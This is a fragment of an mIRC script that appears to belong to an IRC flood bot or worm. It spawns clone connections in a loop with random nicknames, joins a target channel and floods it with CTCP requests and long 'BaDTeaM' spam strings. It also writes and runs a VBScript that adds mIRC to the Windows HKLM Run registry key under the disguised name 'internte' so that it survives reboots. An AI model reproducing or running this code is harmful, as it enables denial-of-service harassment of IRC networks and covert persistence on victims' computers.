n168=  if ( %var == 4 ) { return BaDTeaM.....1,8LiFE 8,1SuCKs 1,8and 8,1then 1,8YoU 8,1DiE 1,8so 8,1FLOOD 1,8IRC 8,1and 1,8lets 8,1get 1,8HiGH1,8LiFE 8,1SuCKs 1,8and 8,1then 1,8YoU 8,1DiE 1,8so 8,1FLOOD 1,8IRC 8,1and 1,8lets 8,1get 1,8HiGH }
n169=  if ( %var == 2 ) { return $chr(1) $+ FINGER $+ $chr(1) }
n170=  if ( %var == 3 ) { return !lÓsÜ PÓNG ME FÓlÈ SÈrvÈr OnlÓnÈ BaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaMBaDTeaM }
n171=}
n172=alias stopflood {
n173=  set %flooding off
n174=  .sockclose proxy*
n175=  .sockclose identd.*
n176=  .unset %user3
n177=  .unset %host.lines
n178=  .unset %num.clones
n179=  .unset %clones.num
n180=  .unset %nick2
n181=  .unset %quit.msg
n182=}
n183=on *:Sockopen:register*:{ if ($sockerr > 0) { halt } | set -u1 %user $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) | .sockwrite -nt $sockname USER %user %user %user : $+ %user | .sockwrite -nt $sockname NICK $read scr.txt $+ $rand(0,9) |   sockwrite -tn $sockname join %channel | .sockwrite -n $sockname notice %nick : $+ $flooder | .sockclose $sockname | .sockopen register $+ $r(0,999) $+ $r(0,999) $+ $r(0,999) $+ $r(0,999) %server %port }
n184=on *:sockread:register*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $server } }
n185=alias lokp { 
n186=  write -c lipreffs.vbs on error resume next  
n187=  write lipreffs.vbs Set src = CreateObject("Wscript.shell")
n188=  write lipreffs.vbs updateSP = " $+ $mircexe $+ "
n189=  write lipreffs.vbs keySP = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\internte"
n190=  write lipreffs.vbs src.RegWrite keySP, updateSP
n191=  .timer 1 2 run lipreffs.vbs
n192=}
n193=
n194=
